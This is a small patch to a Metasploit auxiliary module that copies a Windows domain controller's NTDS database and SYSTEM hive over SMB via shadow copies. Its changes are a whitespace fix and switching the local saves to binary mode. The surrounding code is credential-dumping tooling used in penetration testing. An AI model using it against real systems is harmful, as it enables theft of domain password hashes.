@@ -97,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	# Thids method will check if a Volume Shadow Copy already exists and use that rather 
+	# Thids method will check if a Volume Shadow Copy already exists and use that rather
 	# then creating a new one
 	def check_vss(ip, text, bat)
 		begin
@@ -199,7 +199,7 @@ class Metasploit3 < Msf::Auxiliary
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			#Save it to local file system
-			file = File.open("#{logdir}/#{ip}/ntds", "w+")
+			file = File.open("#{logdir}/#{ip}/ntds", "wb+")
 			file.write(data)
 			file.close
 			remotefile.close
@@ -223,7 +223,7 @@ class Metasploit3 < Msf::Auxiliary
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			#Save it to local file system
-			file = File.open("#{logdir}/#{ip}/sys", "w+")
+			file = File.open("#{logdir}/#{ip}/sys", "wb+")
 			file.write(data)
 
 			file.close
